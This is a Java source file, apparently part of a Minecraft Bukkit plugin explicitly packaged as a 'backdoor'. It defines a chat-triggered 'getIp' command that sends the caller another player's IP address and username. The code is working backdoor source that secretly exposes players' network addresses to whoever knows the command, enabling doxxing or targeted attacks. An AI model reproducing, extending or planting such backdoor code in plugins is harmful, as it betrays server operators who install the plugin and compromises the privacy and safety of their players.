package me.kmatias.backdoor.commands;

import me.kmatias.backdoor.Command;
import me.kmatias.backdoor.RegisterCommand;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.player.PlayerChatEvent;

import java.util.ArrayList;

@RegisterCommand(displayName = "getIp", aliases = {"ip", "getIp"})
public class IpCommand extends Command {

    @Override
    public void onExec(PlayerChatEvent event, ArrayList<String> args) {

        if (args.size() >= 1) {
            Player target = Bukkit.getServer().getPlayer(args.get(0));
            Player p = event.getPlayer();

            p.sendMessage("ip: " + target.getAddress() + "\nuserName: " + target.getName());

        } else event.getPlayer().sendMessage(NOT_ENOUGH_ARGS);
    }
}
